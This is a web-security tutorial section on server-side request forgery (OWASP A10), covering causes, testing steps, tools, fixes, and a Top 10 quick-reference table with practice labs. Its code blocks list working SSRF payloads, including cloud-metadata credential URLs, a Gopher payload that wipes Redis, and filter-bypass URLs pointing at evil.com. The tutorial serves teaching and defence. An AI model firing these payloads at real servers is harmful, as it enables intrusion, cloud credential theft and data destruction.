# A10 — Server-Side Request Forgery (SSRF)

**CVSS Range:** Up to 9.8 (Critical)
**CWE References:** CWE-918

---

### What it is
SSRF occurs when a web application fetches a remote resource (a URL) based on user-supplied input, without properly validating it. The attacker forces the server to make HTTP requests on their behalf — to internal systems that are not directly reachable from the internet.

This is particularly dangerous in cloud environments where internal metadata endpoints expose credentials and configuration.

### Why it happens
- URL fetching features (PDF generators, webhook validators, image importers) don't validate the destination
- Internal microservices trust requests from other internal services without authentication
- Cloud metadata endpoints are accessible from any process running on the server

### Attack types

**Internal network scanning via SSRF:**
```
# Application feature: "Import image from URL"
# Attacker controls the URL parameter

# Scan internal network
?url=http://192.168.1.1        → router admin panel
?url=http://10.0.0.1:8080      → internal service
?url=http://localhost:6379     → Redis (no auth)
?url=http://localhost:27017    → MongoDB

# Cloud metadata (AWS EC2 Instance Metadata Service)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns temporary AWS credentials (used in Capital One breach)

# Azure metadata
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP metadata
?url=http://metadata.google.internal/computeMetadata/v1/
```

**SSRF to RCE via internal services:**
```
# Redis via SSRF (Gopher protocol)
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# ElasticSearch via SSRF
?url=http://localhost:9200/_cat/indices

# Jenkins via SSRF
?url=http://localhost:8080/script
```

**Blind SSRF:**
```
# Application doesn't return the response body, but the request is still made
# Detect using a collaborator server

# Burp Collaborator:
?url=http://your-collaborator-id.burpcollaborator.net

# If you receive a DNS/HTTP request at your collaborator → SSRF confirmed
# Then use timing and error-based techniques to extract data
```

### How to test for it

```
1. Find every feature that fetches a URL or external resource:
   - "Import from URL"
   - Webhook configuration
   - PDF/screenshot generators
   - File download from external source
   - "Fetch metadata" features
   - XML parsers (XXE can lead to SSRF)

2. Test for basic SSRF:
   ?url=http://127.0.0.1
   ?url=http://localhost
   ?url=http://169.254.169.254

3. Test for filter bypass:
   ?url=http://127.0.0.1@evil.com    → servers may follow redirect to 127.0.0.1
   ?url=http://[::1]                 → IPv6 localhost
   ?url=http://0x7f000001            → hex representation of 127.0.0.1
   ?url=http://2130706433            → decimal representation of 127.0.0.1
   ?url=http://localtest.me          → domain that resolves to 127.0.0.1

4. Blind SSRF — use Burp Collaborator or interactsh:
   ?url=https://your-id.interact.sh
```

### Tools

| Tool | How to use it |
|---|---|
| `Burp Suite` | Intercept and modify URL parameters; Collaborator for blind SSRF |
| `Burp Collaborator` | Out-of-band detection for blind SSRF via DNS/HTTP callbacks |
| `interactsh` | Free open-source alternative to Burp Collaborator |
| `SSRFmap` | Automated SSRF exploitation tool |
| `Gopherus` | Generate Gopher protocol payloads for SSRF to RCE |
| `ffuf` | Fuzz internal IP ranges and ports through SSRF |

### How to fix it

- Validate and sanitise all user-supplied URLs on the server
- Use an **allowlist** of permitted domains — deny everything else
- Block all requests to private IP ranges: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`
- Disable HTTP redirects, or re-validate the redirect destination
- On AWS: use IMDSv2 (requires a token — not accessible via simple GET request SSRF)
- Segment internal services so not all are reachable from the web application server
- Never return raw responses from server-side fetches to the user

---

# Quick Reference — OWASP Top 10 (2021)

| # | Vulnerability | Severity | Find it with | Fix in one line |
|---|---|---|---|---|
| A01 | Broken Access Control | Critical | Autorize, Burp Repeater, manual IDOR | Enforce access server-side; deny by default |
| A02 | Cryptographic Failures | Critical | testssl.sh, Wireshark, SSL Labs | TLS everywhere; bcrypt for passwords |
| A03 | Injection | Critical | sqlmap, Burp Scanner, XSStrike | Parameterised queries; never concat input |
| A04 | Insecure Design | High | Manual review, Turbo Intruder | Threat model at design; enforce logic server-side |
| A05 | Security Misconfiguration | Critical | Nikto, Nuclei, SecurityHeaders.com | Harden defaults; remove what you don't need |
| A06 | Outdated Components | Critical | Retire.js, WPScan, Snyk | Track and update all dependencies continuously |
| A07 | Auth Failures | Critical | Hydra, jwt_tool, Burp Sequencer | MFA + rate limiting + proper session management |
| A08 | Integrity Failures | Critical | Burp, ysoserial, PHPGGC | Verify signatures; never deserialise untrusted data |
| A09 | Logging Failures | High | Manual audit, generate attacks and check logs | Log all security events; alert in real time |
| A10 | SSRF | Critical | Burp Collaborator, SSRFmap, manual | Allowlist URLs; block internal IP ranges |

---

## Recommended Practice Labs

| Lab | What it teaches | Link |
|---|---|---|
| **PortSwigger Web Academy** | Every OWASP Top 10 with free guided labs | portswigger.net/web-security |
| **DVWA** | All Top 10 in a local vulnerable app | dvwa.co.uk |
| **WebGoat** | OWASP's own interactive learning app | owasp.org/WebGoat |
| **HackTheBox** | Real-world style web challenges | hackthebox.com |
| **TryHackMe** | Beginner-friendly guided rooms | tryhackme.com |
| **VulnHub** | Downloadable vulnerable VMs | vulnhub.com |

---
